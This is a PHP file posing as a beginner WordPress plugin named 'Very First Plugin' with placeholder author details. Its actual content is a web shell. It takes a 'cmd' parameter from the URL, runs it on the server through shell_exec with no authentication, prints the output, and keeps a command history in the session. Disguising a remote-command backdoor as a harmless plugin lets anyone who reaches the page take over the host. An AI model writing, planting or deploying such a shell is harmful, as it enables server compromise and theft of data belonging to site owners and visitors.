<?php
/**
* Plugin Name: Very First Plugin
* Plugin URI: https://www.yourwebsiteurl.com/
* Description: This is the very first plugin I ever created.
* Version: 1.0
* Author: Your Name Here
* Author URI: http://yourwebsiteurl.com/
**/
session_start();

if( empty($_SESSION['history']) ) {
		    $_SESSION['history'] = "";
}


echo '<form action="shell.php" method="get">';
echo 'Command:';
echo '<input style="width:50%" id="cmd" type="text" name="cmd"><br>';
echo '<input value="Run" type="submit">';
echo '<script>';
echo 'var input = document.getElementById("cmd");';
echo 'input.focus();';
echo 'input.select();';
echo '</script>';

echo "</br>";
echo "</br>";

if(isset($_GET["cmd"])){
	if($_GET['cmd'] != ""){
		$command = $_GET['cmd'];
		echo "<b>".$command."</b>";
		echo "</br>";
		echo "</br>";
		echo '<div style="overflow-y:auto;height:27vw;border-width=2px;border-color=black;">';
		echo '<pre>';echo shell_exec($command);echo '</pre>';
		echo "</div></br>";
		$hist = $_SESSION['history'];
		$new_hist = $hist . $command . "</br>";
		$_SESSION['history'] = $new_hist;
	}
}

echo "<b>History</b>";
echo "</br>";
echo '<div style="overflow-y:auto;height:11vw;">';
echo $_SESSION['history'];
echo "</div></br>";
?>
